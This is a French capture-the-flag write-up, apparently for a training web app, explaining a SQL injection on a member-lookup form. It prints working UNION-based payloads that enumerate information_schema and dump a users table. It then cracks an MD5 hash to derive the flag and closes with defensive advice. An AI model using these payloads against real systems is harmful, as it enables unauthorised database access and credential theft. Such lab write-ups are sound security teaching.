# Récupération de la Clé — Injection SQL sur la page Member

## 🔍 Méthode d'exploitation

Pour ce flag, il faut se rendre sur la page **`/?page=member`**.

On y trouve un formulaire demandant l'**ID d'un membre**. En entrant par exemple `1`, on obtient une réponse structurée de cette manière :

```
ID: 1
First name: one
Surname : me
```

Cette structure typique indique une **requête SQL sous-jacente**, ce qui suggère une vulnérabilité aux **injections SQL**.

---

### Étape 1 — Lister les tables et colonnes

On commence par récupérer toutes les tables et leurs colonnes via la requête suivante :

```sql
1 or 1=1 UNION SELECT table_name, column_name FROM information_schema.columns-- -
```

On repère la table **`users`** et ses colonnes : `user_id`, `first_name`, `last_name`, `town`, `country`, `planet`, **`Commentaire`** et **`countersign`**. Ce sont ces deux dernières colonnes qui vont nous intéresser.

---

### Étape 2 — Extraire les données de la table users

On récupère le contenu des colonnes `Commentaire` et `countersign` :

```sql
1 or 1=1 UNION SELECT Commentaire, countersign FROM users-- -
```

On obtient l'indice suivant dans les résultats :

```
ID: 1 or 1=1 UNION SELECT Commentaire, countersign FROM users-- -
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```

---

### Étape 3 — Décrypter le hash MD5

La valeur dans `Surname` est encodée en **MD5**. En la passant dans un décrypteur comme [CrackStation](https://crackstation.net/), on obtient : **`FortyTwo`**

---

### Étape 4 — Appliquer les transformations et générer le flag

Conformément à l'indice :
1. Passer tous les caractères en **minuscule** → `fortytwo`
2. Appliquer un hash **SHA-256** :

```bash
echo -n "fortytwo" | sha256sum
```

---

## 🛡️ Recommandations

Pour se protéger contre les injections SQL :

- Utiliser des **requêtes préparées** (prepared statements) avec des paramètres liés
- **Ne jamais insérer directement** les entrées utilisateur dans une requête SQL
- Mettre en place un système de **validation et d'échappement** des entrées
- Limiter les **privilèges de l'utilisateur SQL** au strict nécessaire